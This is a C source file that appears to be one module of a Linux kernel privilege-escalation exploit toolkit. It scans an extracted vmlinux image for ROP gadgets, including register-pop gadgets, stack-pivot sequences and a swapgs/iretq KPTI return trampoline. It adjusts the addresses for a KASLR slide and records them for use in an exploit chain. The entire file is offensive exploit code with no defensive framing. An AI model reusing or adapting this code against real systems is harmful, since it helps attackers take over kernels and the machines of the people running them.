#include "nfttables.h"
#include "arch.h"
#include "offsets.h"
#include <elf.h>

/*
 * ROP gadget scanner for extracted vmlinux ELF.
 *
 * Scans the .text section for useful byte sequences. False positives
 * are possible (sequence appears inside an immediate or multi-byte
 * instruction), but for the gadgets we need the false positive rate
 * is low enough that the first match is usually valid.
 *
 * For production use, verify gadgets by disassembling a few bytes
 * before the match to confirm instruction alignment.
 */

#ifdef ARCH_X86_64

struct gadget_def {
    const char     *name;
    const uint8_t  *bytes;
    int             len;
    uint64_t       *target;     /* filled into kernel_offsets */
};

static int scan_for_gadgets(const uint8_t *text, size_t text_size,
                            uint64_t text_vaddr,
                            struct kernel_offsets *ko)
{
    /* we want only the first occurrence of each gadget */
    struct gadget_def gadgets[] = {
        {"pop rdi; ret",
         (const uint8_t *)GADGET_POP_RDI_RET,
         GADGET_POP_RDI_RET_LEN,
         &ko->pop_rdi_ret},

        {"pop rsi; ret",
         (const uint8_t *)GADGET_POP_RSI_RET,
         GADGET_POP_RSI_RET_LEN,
         &ko->pop_rsi_ret},

        {"pop rdx; ret",
         (const uint8_t *)GADGET_POP_RDX_RET,
         GADGET_POP_RDX_RET_LEN,
         &ko->pop_rdx_ret},

        {"pop rcx; ret",
         (const uint8_t *)GADGET_POP_RCX_RET,
         GADGET_POP_RCX_RET_LEN,
         &ko->pop_rcx_ret},

        {"pop rax; ret",
         (const uint8_t *)GADGET_POP_RAX_RET,
         GADGET_POP_RAX_RET_LEN,
         &ko->pop_rax_ret},

        {"ret",
         (const uint8_t *)GADGET_RET,
         GADGET_RET_LEN,
         &ko->ret},

        {"xchg rax, rsp; ret",
         (const uint8_t *)GADGET_XCHG_RAX_RSP_RET,
         GADGET_XCHG_RAX_RSP_RET_LEN,
         &ko->xchg_rax_rsp_ret},

        {"push rax; pop rsp; ret",
         (const uint8_t *)GADGET_PUSH_RAX_POP_RSP,
         GADGET_PUSH_RAX_POP_RSP_LEN,
         &ko->push_rax_pop_rsp_ret},

        {"mov rdi, rax; call rdx",
         (const uint8_t *)GADGET_MOV_RDI_RAX_CALL_RDX,
         GADGET_MOV_RDI_RAX_CALL_RDX_LEN,
         &ko->mov_rdi_rax_call_rdx},

        {NULL, NULL, 0, NULL},
    };

    int found = 0;

    for (size_t i = 0; i < text_size; i++) {
        for (struct gadget_def *g = gadgets; g->name; g++) {
            /* skip if already found */
            if (*g->target != 0)
                continue;

            if (i + g->len > text_size)
                continue;

            if (memcmp(text + i, g->bytes, g->len) == 0) {
                *g->target = text_vaddr + i;
                pr_verb("gadget %-28s @ 0x%lx", g->name, *g->target);
                found++;
            }
        }
    }

    return found;
}

/* ── additional gadget patterns ───────────────────────────────── */

/*
 * Some useful compound gadgets that are harder to find by simple byte
 * scan. These are searched with a looser match.
 */

/* look for:  mov rdi, rax ; jmp <reg/mem>
   encoded as 48 89 c7 followed by ff 2x or eb xx */
static uint64_t find_mov_rdi_rax_jmp(const uint8_t *text, size_t sz,
                                      uint64_t base)
{
    for (size_t i = 0; i + 5 < sz; i++) {
        if (text[i]     == 0x48 &&
            text[i + 1] == 0x89 &&
            text[i + 2] == 0xc7 &&
            (text[i + 3] == 0xff || text[i + 3] == 0xeb)) {
            return base + i;
        }
    }
    return 0;
}

/* look for:  swapgs ; ... ; iretq (within ~32 bytes)
   used as the KPTI trampoline return path */
static uint64_t find_swapgs_iretq(const uint8_t *text, size_t sz,
                                   uint64_t base)
{
    /* swapgs = 0f 01 f8, iretq = 48 cf */
    for (size_t i = 0; i + 32 < sz; i++) {
        if (text[i] == 0x0f && text[i+1] == 0x01 && text[i+2] == 0xf8) {
            /* found swapgs, look for iretq within 32 bytes */
            for (size_t j = i + 3; j < i + 32 && j + 1 < sz; j++) {
                if (text[j] == 0x48 && text[j+1] == 0xcf) {
                    return base + i;
                }
            }
        }
    }
    return 0;
}

#endif /* ARCH_X86_64 */

/* ── public entry point ───────────────────────────────────────── */

int gadgets_scan(const char *vmlinux_path, struct kernel_offsets *ko)
{
#ifdef ARCH_X86_64
    uint64_t text_vaddr, text_offset, text_size;

    if (vmlinux_find_text_section(vmlinux_path,
                                  &text_vaddr, &text_offset, &text_size) < 0) {
        pr_verb("gadgets: can't find .text section in %s", vmlinux_path);
        return -1;
    }

    pr_verb("gadgets: .text @ vaddr=0x%lx offset=0x%lx size=0x%lx",
            text_vaddr, text_offset, text_size);

    /* read .text into memory */
    FILE *f = fopen(vmlinux_path, "rb");
    if (!f) return -1;

    uint8_t *text = malloc(text_size);
    if (!text) { fclose(f); return -1; }

    fseek(f, text_offset, SEEK_SET);
    if (fread(text, 1, text_size, f) != text_size) {
        free(text); fclose(f); return -1;
    }
    fclose(f);

    /* apply KASLR offset if we know the real base */
    uint64_t slide = 0;
    if (ko->kernel_base && ko->kernel_base != text_vaddr) {
        slide = ko->kernel_base - text_vaddr;
        pr_verb("gadgets: applying KASLR slide 0x%lx", slide);
    }

    /* scan for standard gadgets */
    int count = scan_for_gadgets(text, text_size, text_vaddr + slide, ko);

    /* scan for compound gadgets */
    if (!ko->mov_rdi_rax_call_rdx) {
        uint64_t g = find_mov_rdi_rax_jmp(text, text_size, text_vaddr + slide);
        if (g) {
            ko->mov_rdi_rax_call_rdx = g;
            pr_verb("gadget %-28s @ 0x%lx", "mov rdi,rax; jmp *", g);
            count++;
        }
    }

    if (!ko->swapgs_restore_regs) {
        uint64_t g = find_swapgs_iretq(text, text_size, text_vaddr + slide);
        if (g) {
            ko->swapgs_restore_regs = g;
            pr_verb("gadget %-28s @ 0x%lx", "swapgs; ...; iretq", g);
            count++;
        }
    }

    free(text);

    if (count > 0)
        ko->resolved |= OFF_GADGETS;

    pr_verb("gadgets: found %d gadgets", count);
    return count;

#else
    (void)vmlinux_path; (void)ko;
    pr_verb("gadget scanning not implemented for this architecture");
    return -1;
#endif
}
